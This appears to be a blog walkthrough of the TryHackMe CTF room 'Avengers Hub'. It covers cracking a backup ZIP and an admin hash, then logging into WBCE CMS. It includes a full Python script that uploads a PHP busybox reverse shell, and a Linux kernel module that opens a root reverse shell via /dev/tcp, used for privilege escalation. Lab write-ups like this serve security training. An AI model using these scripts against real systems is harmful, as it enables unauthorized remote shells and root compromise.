---
title: "TryHackme - Avengers Hub (Hackfinity Battle Encore)"
date: 2025-03-29 00:00:00 +0800
categories: [TryHackMe]
tags: [Hacking, CTF, Pentesting, TryHackMe, THM, Hard, Web, Zip, john, ffuf, Kernel, Linux, sudo, CMS]
author: 0xT0xic
image:
    path: https://i.ibb.co/RprjcfFp/2.png
---


Avengers Hub is a challenging CTF (Capture The Flag) scenario that tests some basic penetration testing skills across multiple attack vectors. The challenge involves progressively escalating access through CMS vulnerabilities, SSH key manipulation, and kernel module exploitation.

## Reconnaissance

### Network Scanning

We begin with a comprehensive network scan to understand the target's infrastructure:

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">scan-results.txt</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:f0:95:8d:c2:0e:a1:97:13:2f:56:bc:bf:26:7b:e1 (RSA)
|   256 4a:8c:6b:56:eb:2f:49:e9:63:5a:65:07:e7:14:15:b2 (ECDSA)
|_  256 b5:fd:c4:58:a5:29:95:fc:5d:8f:c0:01:f1:52:14:a5 (ED25519)
|
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Cyber Avengers Hub - Under Construction
|_http-server-header: Apache/2.4.41 (Ubuntu)</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

Scan Results:

- Port 22: SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.12)
- Port 80: HTTP (Apache httpd 2.4.41 Ubuntu)

The initial scan reveals a minimal attack surface with two primary ports open. The web server's title indicates an "Under Construction" website, suggesting potential hidden functionality.

<img src="https://i.ibb.co/vvdfhNwQ/1.png" alt="Avengers Hub" width="650">

## Web Enumeration

### Directory Fuzzing

After initial reconnaissance, directory fuzzing uncovered several interesting paths:

- `/search` (ultimately a rabbit hole)
- `/admin` (WBCE CMS login page)
- `/backups` (critical discovery point)

<img src="https://i.ibb.co/RTPtYj50/image.png" alt="Avengers Hub" width="650">

### Backup File

The `/backups` directory proved to be the initial breakthrough. We discovered a password-protected ZIP file named `breakglass.zip` and downloaded it locally.

<img src="https://i.ibb.co/wFZJt7Ct/3.png" alt="Avengers Hub" width="650">

Using `zip2john` and `john`, we successfully cracked the archive.

<img src="https://i.ibb.co/VW51G7dz/image.png" alt="Avengers Hub" width="650">

Inside the ZIP, a `recovery.txt` file contained a crucial piece of information:

```In case of emergency, here's the MD5 hash of the admin account: b0439fae31f8xxxxxxxxxxxxxxxxxx```

### Hash Cracking

The MD5 hash was cracked using CrackStation, revealing the admin password: `sxxxxxxxx` for the admin panel

<img src="https://i.ibb.co/ycRHYPR8/image.png" alt="Avengers Hub" width="650">

## Web Shell

### CMS Vulnerabilitiy

1. Login Confirmation
- Successfully authenticated to the WBCE CMS admin panel at `/admin` with the username admin and cracked MD5 hash
- Identified CMS version 1.62

<img src="https://i.ibb.co/wFFx3D9y/image.png" alt="Avengers Hub" width="650">

2. Exploit Research
- Located potential exploit: ["Exploit-DB 52039"](https://www.exploit-db.com/exploits/52039), based on the version
- However, default exploit failed due to disabled PHP functions

### Custom Reverse Shell

Recognizing the disabled functions, we crafted our own custom Python-based exploit to bypass restrictions:

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">web-exploit.py</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">import requests
from bs4 import BeautifulSoup
import time

def login(url, username, password):

    print("Logging in...")
    with requests.Session() as session:

        response = session.get(url + "/admin/login/index.php")
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form', attrs={'name': 'login'})
        form_data = {input_tag['name']: input_tag.get('value', '') for input_tag in form.find_all('input') if input_tag.get('type') != 'submit'}

        # Dynamically update username and password fields
        form_data[soup.find('input', {'name': 'username_fieldname'})['value']] = username
        form_data[soup.find('input', {'name': 'password_fieldname'})['value']] = password

        post_response = session.post(url + "/admin/login/index.php", data=form_data)

        if "Administration" in post_response.text:
            print("Login successful!")
            return session
        else:
            print("Login failed.")
            return None

def upload_file(session, url):
    print("Preparing payload...")

    # Busybox reverse shell payload

    reverse_shell_payload = """<?php

$target_ip = '10.10.xx.xx';
$target_port = 443;

$conn_cmd = "busybox nc $target_ip $target_port -e /bin/sh";
$handle = popen($conn_cmd, 'r');
if($handle) {
    while(!feof($handle)) { 
        fread($handle, 4096); 
    }
    pclose($handle);
}
>""" <----- Add a "?" before the `>`

    files = {'upload[]': ('shell.inc', reverse_shell_payload, 'application/octet-stream')}

    data = {
        'reqid': '18f3a5c13d42c5',
        'cmd': 'upload',
        'target': 'l1_Lw',
        'mtime[]': '1714669495'
    }

    response = session.post(url + "/modules/elfinder/ef/php/connector.wbce.php", 

                            files=files, data=data)

    if response.status_code == 200:
        print("Payload deployed successfully.")
        print("Listener: nc -lvnp 443")
    else:
        print("Deployment failed.")
        print(response.text)

if name == "__main__":
    url = "http://10.10.xx.xx"

    username = "admin"
    password = "sxxxxxxxxx"

    session = login(url, username, password)
    if session:
        upload_file(session, url)</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

<img src="https://i.ibb.co/TqxycDxV/image.png" alt="Avengers Hub" width="650">

## User Shell

### SSH Key Injection

Write permissions were discovered in void's `authorized_key` file, allowing unauthorized modification. A new SSH key pair was generated using ssh-keygen, and the public key was injected into the file. This enabled SSH access as void without requiring a password, securing an User shell on the system.

<img src="https://i.ibb.co/QFfd4W9r/image.png" alt="Avengers Hub" width="650">

## Privilege Escalation to root

### Kernel Module Exploitation

Running `sudo -l` revealed that user can execute `/sbin/insmod cyberavengers.ko` and `/sbin/rmmod cyberavengers` as root. And void had privileges to manage kernel modules. A custom kernel module (`cyberavengers.c`) was created for privilege escalation:

<img src="https://i.ibb.co/HDykmYZL/image.png" alt="Avengers Hub" width="650">

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">cyberavengers.c</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/sched.h>

static int shell_thread(void *data) {
    char *argv[] = { "/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1", NULL };
    static char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static int __init shell_init(void) {
    printk(KERN_INFO "Attempting reverse shell\n");
    kthread_run(shell_thread, NULL, "rev_shell_thread");
    return 0;
}

static void __exit shell_cleanup(void) {
    printk(KERN_INFO "Reverse shell module unloaded\n");
}

module_init(shell_init);
module_exit(shell_cleanup);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("T0xic");
MODULE_DESCRIPTION("Reverse Shell Module");</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

but compiling it wasn’t straightforward. Attempting to compile with gcc -c failed due to missing kernel headers and incorrect compilation flags. A Makefile had to be written to properly compile the module using the kernel build system:

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Makefile</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">obj-m += cyberavenger.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

Once compiled and loaded with `sudo insmod cyberavengers.ko`, root access was successfully obtained, granting full control over the system.

<img src="https://i.ibb.co/N24ZdGb8/image.png" alt="Avengers Hub" width="850">